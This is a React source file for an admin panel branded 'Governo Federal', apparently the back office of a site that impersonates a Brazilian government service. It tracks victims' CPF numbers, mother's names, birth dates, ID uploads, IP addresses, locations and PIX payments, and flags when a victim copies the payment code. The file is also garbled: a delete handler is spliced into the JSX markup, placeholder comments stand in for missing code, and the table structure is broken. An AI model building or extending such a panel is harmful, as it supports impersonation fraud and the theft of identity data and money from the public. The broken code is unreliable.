"use client";

import { GovHeader } from "@/components/GovHeader";
import { Search, Filter, Download, Eye, MoreHorizontal, CheckCircle2, Clock, XCircle, RotateCcw, Home, Users, CreditCard, Settings, PlusCircle, LogOut, Globe, Trash2 } from "lucide-react";
import { useState, useEffect } from "react";
import { Solicitation } from "@/lib/db";

export default function AdminPage() {
    const [solicitacoes, setSolicitacoes] = useState<Solicitation[]>([]);
    const [loading, setLoading] = useState(true);
    const [selectedSolicitacao, setSelectedSolicitacao] = useState<Solicitation | null>(null);
    const [onlineUsers, setOnlineUsers] = useState(0);
    const [analytics, setAnalytics] = useState<{ step: string, count: number }[]>([]);
    const [activeSessions, setActiveSessions] = useState<any[]>([]);
    const [currentView, setCurrentView] = useState<'dashboard' | 'solicitations' | 'finance' | 'live-view'>('dashboard');

    const fetchData = async () => {
        try {
            const res = await fetch('/api/solicitations');
            const data = await res.json();

            if (data.solicitations) {
                setSolicitacoes(data.solicitations.reverse());
                setOnlineUsers(data.onlineUsers || 0);
                setAnalytics(data.analytics || []);
                setActiveSessions(data.activeSessions || []);
            } else if (Array.isArray(data)) {
                // Fallback for old API response structure if not yet updated
                setSolicitacoes(data.reverse());
            }
        } catch (error) {
            console.error("Failed to fetch data", error);
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        fetchData();
        // Poll every 5 seconds for updates
        const interval = setInterval(fetchData, 5000);
        return () => clearInterval(interval);
    }, []);

    const handleStatusUpdate = async (cpf: string, newStatus: string) => {
        // Optimistic update
        setSolicitacoes(prev => prev.map(s => s.cpf === cpf ? { ...s, status: newStatus as any } : s));
        if (selectedSolicitacao && selectedSolicitacao.cpf === cpf) {
            setSelectedSolicitacao({ ...selectedSolicitacao, status: newStatus as any });
        }

        try {
            await fetch('/api/solicitations', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cpf, status: newStatus })
            });
            fetchData(); // Refresh to ensure sync
        } catch (error) {
            console.error("Failed to update status", error);
        }
    };

    const createTestData = async () => {
        setLoading(true);
        const randomCPF = Math.floor(Math.random() * 10000000000).toString().padStart(11, '0');
        const testData = {
            cpf: randomCPF,
            nome: "Usuário Teste " + Math.floor(Math.random() * 100),
            email: "teste@exemplo.com",
            nascimento: "01/01/2000",
            nome_mae: "Mãe Teste",
            status: "pendente",
            valor: "24,90",
            docs: {
                rg: "https://via.placeholder.com/150",
                comprovante: "https://via.placeholder.com/150"
            }
        };

        try {
            await fetch('/api/solicitations', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(testData)
            });
            await fetchData();
            alert("Solicitação de teste criada com sucesso!");
        } catch (error) {
            console.error("Failed to create test data", error);
            alert("Erro ao criar teste.");
        } finally {
            setLoading(false);
        }
    };

    // Calculate Stats
    const totalSolicitacoes = solicitacoes.length;
    const totalAprovados = solicitacoes.filter(s => s.status === 'aprovado').length;
    const totalPendentes = solicitacoes.filter(s => s.status === 'analise' || s.status === 'pendente').length;
    const totalReceita = solicitacoes.reduce((acc, curr) => {
        const val = parseFloat(curr.valor?.replace('R$', '').replace(',', '.') || "0");
        return acc + val;
    }, 0).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

    // Funnel Stats
    const getStepCount = (step: string) => analytics.find(a => a.step === step)?.count || 0;
    const countHome = getStepCount('home_view');
    const countForm = getStepCount('solicitando_dados_pessoais');
    const countDocs = getStepCount('enviando_documentos');
    const countReview = getStepCount('analisando');
    const countPay = getStepCount('payment_page_view');

    // Simple conversion rates (Home -> Next Step)
    const rateForm = countHome > 0 ? Math.round((countForm / countHome) * 100) : 0;
    const rateDocs = countHome > 0 ? Math.round((countDocs / countHome) * 100) : 0;
    const rateReview = countHome > 0 ? Math.round((countReview / countHome) * 100) : 0;
    const ratePay = countHome > 0 ? Math.round((countPay / countHome) * 100) : 0;

    const getStatusColor = (status: string) => {
        switch (status) {
            case 'aprovado': return 'bg-green-100 text-green-700';
            case 'analise': return 'bg-blue-100 text-blue-700';
            case 'rejeitado': return 'bg-red-100 text-red-700';
            default: return 'bg-yellow-100 text-yellow-700';
        }
    };

    return (
        <div className="min-h-screen bg-slate-100 font-sans text-slate-900 flex">
            {/* Same sidebar and layout code... */}
            {/* SIDEBAR */}
            <aside className="w-64 bg-slate-900 text-slate-300 flex flex-col fixed h-full z-20 shadow-xl">
                <div className="p-6 border-b border-slate-800 flex items-center gap-3">
                    <div className="w-8 h-8 bg-gov-blue-600 rounded-lg flex items-center justify-center text-white font-bold shadow-lg shadow-blue-900/50">A</div>
                    <div>
                        <h1 className="font-bold text-white leading-tight">Painel Admin</h1>
                        <p className="text-[10px] text-slate-500 uppercase tracking-wider">Governo Federal</p>
                    </div>
                </div>

                <nav className="flex-1 p-4 space-y-2 overflow-y-auto">
                    <div className="px-4 py-2 text-xs font-bold text-slate-500 uppercase tracking-wider">Principal</div>
                    <button onClick={() => setCurrentView('dashboard')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl shadow-md transition-all font-medium ${currentView === 'dashboard' ? 'bg-gov-blue-600 text-white' : 'hover:bg-slate-800 text-slate-400 hover:text-white'}`}>
                        <Home className="h-5 w-5" /> Dashboard
                    </button>
                    <button onClick={() => setCurrentView('live-view')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl shadow-md transition-all font-medium ${currentView === 'live-view' ? 'bg-gov-blue-600 text-white' : 'hover:bg-slate-800 text-slate-400 hover:text-white'}`}>
                        <Globe className="h-5 w-5 animate-pulse text-green-400" /> Live View <span className="ml-auto bg-green-500 text-white text-[10px] px-1.5 py-0.5 rounded-full">{onlineUsers}</span>
                    </button>
                    <button onClick={() => setCurrentView('solicitations')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl shadow-md transition-all font-medium ${currentView === 'solicitations' ? 'bg-gov-blue-600 text-white' : 'hover:bg-slate-800 text-slate-400 hover:text-white'}`}>
                        <Users className="h-5 w-5" /> Solicitações
                    </button>
                    <button onClick={() => setCurrentView('finance')} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl shadow-md transition-all font-medium ${currentView === 'finance' ? 'bg-gov-blue-600 text-white' : 'hover:bg-slate-800 text-slate-400 hover:text-white'}`}>
                        <CreditCard className="h-5 w-5" /> Financeiro
                    </button>

                    <div className="px-4 py-2 text-xs font-bold text-slate-500 uppercase tracking-wider mt-6">Sistema</div>
                    <a href="#" className="flex items-center gap-3 px-4 py-3 hover:bg-slate-800 text-slate-400 hover:text-white rounded-xl transition-all font-medium">
                        <Settings className="h-5 w-5" /> Configurações
                    </a>
                </nav>

                <div className="p-4 border-t border-slate-800">
                    <div className="bg-slate-800 rounded-xl p-4 mb-4">
                        <div className="flex items-center gap-3 mb-2">
                            <div className="bg-green-500/20 p-1.5 rounded-full">
                                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                            </div>
                            <span className="text-sm font-bold text-green-400">{onlineUsers} Online</span>
                        </div>
                        <p className="text-xs text-slate-500">Usuários ativos agora</p>
                    </div>
                    <button
                        onClick={async () => {
                            await fetch('/api/auth/logout', { method: 'POST' });
                            window.location.href = '/admin/login';
                        }}
                        className="flex items-center gap-3 px-4 py-3 hover:bg-slate-800 text-red-400 w-full rounded-xl transition-all font-medium text-sm"
                    >
                        <LogOut className="h-5 w-5" /> Sair do Painel
                    </button>
                </div>
            </aside>

            {/* MAIN CONTENT */}
            <main className="flex-1 ml-64 p-8 overflow-y-auto min-h-screen">

                {/* Header Actions */}
                <div className="flex justify-between items-center mb-8">
                    <div>
                        <h2 className="text-2xl font-bold text-slate-800">
                            {currentView === 'dashboard' ? 'Dashboard Geral' : currentView === 'solicitations' ? 'Gestão de Solicitações' : 'Visão Financeira'}
                        </h2>
                        <p className="text-slate-500 text-sm">Bem-vindo de volta, Admin.</p>
                    </div>
                    <div className="flex gap-3">
                        <button onClick={createTestData} className="bg-slate-800 text-white px-4 py-2.5 rounded-xl font-bold text-sm flex items-center gap-2 hover:bg-slate-700 transition-all shadow-lg shadow-slate-200">
                            <PlusCircle className="h-4 w-4" />
                            Criar Teste
                        </button>
                        <button onClick={fetchData} className="bg-white border border-slate-200 text-slate-600 px-4 py-2.5 rounded-xl font-bold text-sm flex items-center gap-2 hover:bg-slate-50 transition-colors">
                            <RotateCcw className="h-4 w-4" />
                            Atualizar
                        </button>
                    </div>
                </div>

                {/* KPI Cards (Always visible or specific? Let's keep them on Dashboard) */}
                {currentView === 'dashboard' && (
                    <>
                        <div className="grid grid-cols-4 gap-6 mb-8">
                            <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm relative overflow-hidden">
                                <div className="absolute top-0 right-0 p-4 opacity-10">
                                    <Users className="h-16 w-16 text-blue-600" />
                                </div>
                                <p className="text-sm font-bold text-slate-500 uppercase tracking-wider mb-1">Total Solicitações</p>
                                <h3 className="text-3xl font-extrabold text-slate-800">{totalSolicitacoes}</h3>
                                <p className="text-xs text-green-600 font-bold mt-2 flex items-center gap-1">
                                    <Clock className="h-3 w-3" /> Atualizado agora
                                </p>
                            </div>
                            <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm relative overflow-hidden">
                                <div className="absolute top-0 right-0 p-4 opacity-10">
                                    <CheckCircle2 className="h-16 w-16 text-green-600" />
                                </div>
                                <p className="text-sm font-bold text-slate-500 uppercase tracking-wider mb-1">Aprovados</p>
                                <h3 className="text-3xl font-extrabold text-slate-800">{totalAprovados}</h3>
                                <p className="text-xs text-slate-400 mt-2">Pagamento confirmado</p>
                            </div>
                            <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm relative overflow-hidden">
                                <div className="absolute top-0 right-0 p-4 opacity-10">
                                    <Clock className="h-16 w-16 text-yellow-600" />
                                </div>
                                <p className="text-sm font-bold text-slate-500 uppercase tracking-wider mb-1">Pendentes</p>
                                <h3 className="text-3xl font-extrabold text-slate-800">{totalPendentes}</h3>
                                <p className="text-xs text-yellow-600 font-bold mt-2">Aguardando ação</p>
                            </div>
                            <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm relative overflow-hidden ring-4 ring-green-50">
                                <div className="absolute top-0 right-0 p-4 opacity-10">
                                    <CreditCard className="h-16 w-16 text-green-600" />
                                </div>
                                <p className="text-sm font-bold text-slate-500 uppercase tracking-wider mb-1">Receita Estimada</p>
                                <h3 className="text-3xl font-extrabold text-green-700">{totalReceita}</h3>
                                <p className="text-xs text-green-600 font-bold mt-2">+3 novos hoje</p>
                            </div>
                        </div>

                        {/* FUNNEL CHART SECTION */}
                        <div className="grid grid-cols-3 gap-6 mb-8">
                            <div className="col-span-2 bg-white p-6 rounded-2xl border border-slate-200 shadow-sm">
                                <h3 className="font-bold text-slate-800 mb-6 flex items-center gap-2">
                                    <Users className="h-5 w-5 text-gov-blue-600" />
                                    Monitoramento de Etapas (Tempo Real)
                                </h3>

                                <div className="space-y-6">
                                    {/* Step 1: Home */}
                                    <div className="relative">
                                        <div className="flex justify-between text-sm font-bold text-slate-700 mb-1">
                                            <span className="flex items-center gap-2"><div className="w-2 h-2 rounded-full bg-blue-600"></div> 1. Landing Page</span>
                                            <span>{countHome} online</span>
                                        </div>
                                        <div className="w-full bg-slate-100 rounded-full h-2">
                                            <div className="bg-blue-600 h-2 rounded-full transition-all duration-500" style={{ width: '100%' }}></div>
                                        </div>
                                    </div>

                                    {/* Step 2: Form */}
                                    <div className="relative pl-4 border-l-2 border-slate-100">
                                        <div className="flex justify-between text-sm font-bold text-slate-700 mb-1">
                                            <span className="flex items-center gap-2"><div className="w-2 h-2 rounded-full bg-indigo-500"></div> 2. Preenchendo Dados</span>
                                            <span>{countForm} online</span>
                                        </div>
                                        <div className="w-full bg-slate-100 rounded-full h-2">
                                            <div className="bg-indigo-500 h-2 rounded-full transition-all duration-500" style={{ width: `${Math.min(rateForm, 100)}%` }}></div>
                                        </div>
                                        <p className="text-[10px] text-slate-400 mt-1 text-right">{rateForm}% conversão</p>
                                    </div>

                                    {/* Step 3: Docs */}
                                    <div className="relative pl-4 border-l-2 border-slate-100">
                                        <div className="flex justify-between text-sm font-bold text-slate-700 mb-1">
                                            <span className="flex items-center gap-2"><div className="w-2 h-2 rounded-full bg-purple-500"></div> 3. Enviando Documentos</span>
                                            <span>{countDocs} online</span>
                                        </div>
                                        <div className="w-full bg-slate-100 rounded-full h-2">
                                            <div className="bg-purple-500 h-2 rounded-full transition-all duration-500" style={{ width: `${Math.min(rateDocs, 100)}%` }}></div>
                                        </div>
                                    </div>

                                    {/* Step 4: Analysis/Review */}
                                    <div className="relative pl-4 border-l-2 border-slate-100">
                                        <div className="flex justify-between text-sm font-bold text-slate-700 mb-1">
                                            <span className="flex items-center gap-2"><div className="w-2 h-2 rounded-full bg-orange-500"></div> 4. Aguardando Aprovação</span>
                                            <span>{countReview} online</span>
                                        </div>
                                        <div className="w-full bg-slate-100 rounded-full h-2">
                                            <div className="bg-orange-500 h-2 rounded-full transition-all duration-500" style={{ width: `${Math.min(rateReview, 100)}%` }}></div>
                                        </div>
                                    </div>

                                    {/* Step 5: Payment */}
                                    <div className="relative pl-4 border-l-2 border-slate-100">
                                        <div className="flex justify-between text-sm font-bold text-slate-700 mb-1">
                                            <span className="flex items-center gap-2"><div className="w-2 h-2 rounded-full bg-green-600"></div> 5. Tela de Pagamento</span>
                                            <span className="text-green-600">{countPay} online</span>
                                        </div>
                                        <div className="w-full bg-slate-100 rounded-full h-2">
                                            <div className="bg-green-600 h-2 rounded-full transition-all duration-500" style={{ width: `${Math.min(ratePay, 100)}%` }}></div>
                                        </div>
                                        <p className="text-[10px] text-green-600 font-bold mt-1 text-right">{ratePay}% finalização</p>
                                    </div>
                                </div>
                            </div>

                            <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm flex flex-col items-center justify-center text-center">
                                <div className="bg-blue-50 p-6 rounded-full mb-6 relative">
                                    <Clock className="w-12 h-12 text-blue-600" />
                                    <span className="absolute top-0 right-0 flex h-4 w-4">
                                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                                        <span className="relative inline-flex rounded-full h-4 w-4 bg-green-500"></span>
                                    </span>
                                </div>
                                <h3 className="font-bold text-slate-800 text-2xl mb-2">{onlineUsers}</h3>
                                <p className="text-slate-500 font-medium mb-1">Usuários Ativos Agora</p>
                                <p className="text-xs text-slate-400 max-w-[200px]">Monitorando atividade nos últimos 5 minutos em todo o site.</p>
                            </div>
                        </div>
                    </>
                )}

                {/* SOLICITATIONS LIST (Visible only in Solicitations or Dashboard if we want a summary, but lets keep specific) */}
                {currentView !== 'dashboard' && (
                    <div className="mb-6">
                        {/* Filters only show in List view */}
                        <div className="bg-white p-4 rounded-xl border border-slate-200 shadow-sm mb-6 flex gap-4">
                            <div className="flex-1 relative">
                                <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 h-5 w-5" />
                                <input
                                    placeholder="Buscar por nome, CPF ou protocolo..."
                                    className="w-full pl-10 pr-4 py-2 border border-slate-200 rounded-lg focus:ring-2 focus:ring-gov-blue-500 outline-none"
                                />
                            </div>
                            <button className="px-4 py-2 border border-slate-200 rounded-lg flex items-center gap-2 text-slate-600 hover:bg-slate-50 font-medium">
                                <Filter className="h-4 w-4" />
                                Filtros
                            </button>
                        </div>
                    </div>
                )}

                {/* VIEW SWITCHER */}
                {currentView === 'live-view' ? (
                    <div className="space-y-6 animate-in fade-in slide-in-from-right-4">
                        <div className="bg-slate-900 rounded-2xl p-8 text-white shadow-xl relative overflow-hidden flex items-center justify-between">
                            <div className="relative z-10">
                                <h2 className="text-3xl font-extrabold mb-1 flex items-center gap-3">
                                    Live View <span className="bg-green-500 text-xs px-2 py-1 rounded-full animate-pulse">AO VIVO</span>
                                </h2>
                                <p className="text-slate-400">Monitoramento de tráfego em tempo real.</p>
                            </div>
                            <div className="text-right">
                                <p className="text-5xl font-mono font-bold text-green-400">{activeSessions.length}</p>
                                <p className="text-xs text-slate-500 uppercase tracking-widest">Sessões Ativas</p>
                            </div>
                        </div>

                        <div className="bg-white rounded-xl border border-slate-200 shadow-sm overflow-hidden">
                            <table className="w-full text-left">
                                <thead className="bg-slate-50 border-b border-slate-200">
                                    <tr>
                                        <th className="p-4 w-1"></th>
                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Visitante ID</th>
                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Localização Atual</th>
                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase">Atividade</th>
                                        <th className="p-4 text-xs font-bold text-slate-500 uppercase text-right">Visto por último</th>
                                    </tr>
                                </thead>
                                <tbody className="divide-y divide-slate-100">
                                    {activeSessions.length === 0 ? (
                                        <tr><td colSpan={5} className="p-8 text-center text-slate-500">Nenhum usuário ativo no momento.</td></tr>
                                    ) : (
    const handleDelete = async (cpf: string) => {
                                            if (!confirm("Tem certeza que deseja EXCLUIR permanentemente esta solicitação?")) return;

                                            try {
                                                await fetch(`/api/solicitations?cpf=${cpf}`, { method: 'DELETE' });
                                                setSolicitacoes(prev => prev.filter(s => s.cpf !== cpf));
                                                if (selectedSolicitacao?.cpf === cpf) setSelectedSolicitacao(null);
                                                alert("Solicitação excluída.");
                                            } catch (error) {
                                                console.error("Erro ao excluir", error);
                                                alert("Erro ao excluir.");
                                            }
                                        };

    // ... (rest of render)

                                        activeSessions.map((session, idx) => {
                                            const timeAgo = Math.floor((new Date().getTime() - new Date(session.last_seen).getTime()) / 1000 / 60);
                                    return (
                                    <tr key={session.id || idx} className="hover:bg-slate-50 transition-colors">
                                        <td className="p-4">
                                            <div className="h-2.5 w-2.5 rounded-full bg-green-500 animate-pulse shadow-[0_0_8px_rgba(34,197,94,0.6)]"></div>
                                        </td>
                                        <td className="p-4 font-mono text-xs text-slate-500">
                                            <div className="font-bold text-slate-700">{session.ip || 'IP Oculto'}</div>
                                            <div className="text-[10px] text-slate-400">ID: {session.id?.substring(0, 8)}...</div>
                                        </td>
                                        <td className="p-4">
                                            {session.location ? (
                                                <div className="flex items-center gap-1 text-xs font-bold text-slate-700">
                                                    <Globe className="h-3 w-3 text-blue-500" />
                                                    {session.location}
                                                </div>
                                            ) : (
                                                <span className="text-xs text-slate-400 italic">Desconhecido</span>
                                            )}
                                            <div className={`mt-1 inline-block px-2 py-0.5 rounded text-[10px] font-bold border ${session.current_step === 'payment_page_view' ? 'bg-green-50 border-green-200 text-green-700' :
                                                'bg-slate-100 border-slate-200 text-slate-500'}`}>
                                                {session.current_step}
                                            </div>
                                        </td>
                                        <td className="p-4 text-xs text-slate-600">
                                            {/* ... */}

// ... (In Solicitations Table)
                                            <td className="p-4 text-right flex justify-end gap-2">
                                                <button onClick={(e) => { e.stopPropagation(); handleDelete(sol.cpf); }} className="text-red-400 hover:text-red-600 p-2 hover:bg-red-50 rounded-full transition-colors" title="Excluir">
                                                    <Trash2 className="h-4 w-4" />
                                                </button>
                                                <button className="text-slate-400 hover:text-gov-blue-600 p-2 hover:bg-blue-50 rounded-full transition-colors font-bold text-xs border border-slate-200">
                                                    Ver
                                                </button>
                                            </td>
                                        </tbody>
                                    </table>
                                </div>
                )}

                                {/* Detail Modal */}
                                {selectedSolicitacao && (
                                    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm">
                                        <div className="bg-white rounded-2xl shadow-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto">
                                            <div className="p-6 border-b border-slate-100 flex justify-between items-center sticky top-0 bg-white z-10">
                                                <div>
                                                    <h3 className="text-xl font-bold text-slate-800">Detalhes da Solicitação</h3>
                                                    <p className="text-sm text-slate-500">CPF: {selectedSolicitacao.cpf}</p>
                                                </div>
                                                <button onClick={() => setSelectedSolicitacao(null)} className="text-slate-400 hover:text-slate-600">
                                                    <XCircle className="h-6 w-6" />
                                                </button>
                                            </div>

                                            <div className="p-6 space-y-6">
                                                {/* Status & Actions */}
                                                <div className="flex items-center justify-between bg-slate-50 p-4 rounded-xl">
                                                    <div>
                                                        <p className="text-xs font-bold text-slate-500 uppercase mb-1">Status Atual</p>
                                                        <span className={`px-3 py-1 rounded-full text-sm font-bold uppercase ${getStatusColor(selectedSolicitacao.status)}`}>
                                                            {selectedSolicitacao.status}
                                                        </span>
                                                    </div>
                                                    <div className="flex gap-2">
                                                        <button
                                                            onClick={() => handleStatusUpdate(selectedSolicitacao.cpf, 'rejeitado')}
                                                            className="px-4 py-2 rounded-lg border border-red-200 text-red-700 font-bold text-sm hover:bg-red-50"
                                                        >
                                                            Rejeitar
                                                        </button>
                                                        <button
                                                            onClick={() => handleStatusUpdate(selectedSolicitacao.cpf, 'aprovado')}
                                                            className="px-4 py-2 rounded-lg bg-green-600 text-white font-bold text-sm hover:bg-green-700 shadow-md shadow-green-200"
                                                        >
                                                            Aprovar Solicitação
                                                        </button>
                                                    </div>
                                                </div>

                                                {/* Personal Info */}
                                                <div className="grid grid-cols-2 gap-4">
                                                    <div>
                                                        <p className="text-xs text-slate-500 font-bold uppercase">Nome Completo</p>
                                                        <p className="font-medium">{selectedSolicitacao.nome}</p>
                                                    </div>
                                                    <div>
                                                        <p className="text-xs text-slate-500 font-bold uppercase">Email</p>
                                                        <p className="font-medium">{selectedSolicitacao.email}</p>
                                                    </div>
                                                    <div>
                                                        <p className="text-xs text-slate-500 font-bold uppercase">Nome da Mãe</p>
                                                        <p className="font-medium">{selectedSolicitacao.nome_mae || '-'}</p>
                                                    </div>
                                                    <div>
                                                        <p className="text-xs text-slate-500 font-bold uppercase">Data Nascimento</p>
                                                        <p className="font-medium">{selectedSolicitacao.nascimento || '-'}</p>
                                                    </div>
                                                </div>

                                                <div className="h-px bg-slate-100 my-2"></div>

                                                {/* Payment Info */}
                                                <div>
                                                    <h4 className="font-bold text-slate-800 mb-3 flex items-center gap-2">
                                                        <div className="w-1 h-4 bg-green-500 rounded-full"></div>
                                                        Informações de Pagamento (PIX)
                                                    </h4>
                                                    {selectedSolicitacao.pix_copy_paste ? (
                                                        <div className="bg-slate-50 p-4 rounded-xl border border-slate-200">
                                                            <p className="text-xs text-slate-500 font-bold uppercase mb-2">Código Copia e Cola (Gerado)</p>
                                                            <textarea
                                                                readOnly
                                                                className="w-full text-xs font-mono text-slate-600 bg-white p-3 rounded-lg border border-slate-200 h-24 resize-none mb-2 focus:outline-none"
                                                                value={selectedSolicitacao.pix_copy_paste}
                                                            />
                                                            <button
                                                                onClick={() => navigator.clipboard.writeText(selectedSolicitacao.pix_copy_paste || "")}
                                                                className="text-xs font-bold text-gov-blue-600 hover:text-gov-blue-700 flex items-center gap-1"
                                                            >
                                                                <CheckCircle2 className="h-3 w-3" />
                                                                Copiar Código
                                                            </button>

                                                            {selectedSolicitacao.metadata?.pix_copied && (
                                                                <div className="mt-3 bg-green-50 text-green-700 px-3 py-2 rounded-lg text-xs font-bold flex items-center gap-2 animate-pulse">
                                                                    <CheckCircle2 className="h-4 w-4" />
                                                                    Cliente copiou o código
                                                                </div>
                                                            )}
                                                        </div>
                                                    ) : (
                                                        <p className="text-sm text-slate-500 italic">Nenhum pagamento PIX gerado ainda.</p>
                                                    )}
                                                </div>

                                                <div className="h-px bg-slate-100 my-2"></div>

                                                {/* Documents */}
                                                <div>
                                                    <h4 className="font-bold text-slate-800 mb-3 flex items-center gap-2">
                                                        <div className="w-1 h-4 bg-blue-500 rounded-full"></div>
                                                        Documentos Anexados
                                                    </h4>
                                                    {Object.keys(selectedSolicitacao.docs || {}).length > 0 ? (
                                                        <div className="space-y-2">
                                                            {Object.entries(selectedSolicitacao.docs || {}).map(([key, val]) => {
                                                                const fileUrl = val as string;
                                                                return (
                                                                    <a
                                                                        key={key}
                                                                        href={fileUrl}
                                                                        target="_blank"
                                                                        rel="noopener noreferrer"
                                                                        className="flex items-center justify-between p-3 bg-white border border-slate-100 rounded-lg hover:border-gov-blue-500 hover:shadow-md transition-all cursor-pointer group"
                                                                    >
                                                                        <div className="flex items-center gap-3">
                                                                            <div className="h-8 w-8 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center group-hover:bg-gov-blue-600 group-hover:text-white transition-colors">
                                                                                <Eye className="h-4 w-4" />
                                                                            </div>
                                                                            <div>
                                                                                <p className="text-sm font-bold text-slate-700 capitalize group-hover:text-gov-blue-700">{key.replace(/_/g, " ")}</p>
                                                                                <p className="text-xs text-slate-400 truncate max-w-[200px]">Ver documento</p>
                                                                            </div>
                                                                        </div>
                                                                        <span className="text-xs bg-green-50 text-green-700 px-2 py-1 rounded font-bold group-hover:bg-green-100">Abrir</span>
                                                                    </a>
                                                                );
                                                            })}
                                                        </div>
                                                    ) : (
                                                        <p className="text-sm text-slate-500 italic">Nenhum documento enviado ainda.</p>
                                                    )}
                                                </div>

                                            </div>

                                            <div className="p-4 bg-slate-50 border-t border-slate-100 text-center text-xs text-slate-400">
                                                ID da Transação: {selectedSolicitacao.transaction_id || 'N/A'}
                                            </div>
                                        </div>
                                    </div>
                                )}
                            </main>
                        </div>
                        );
}
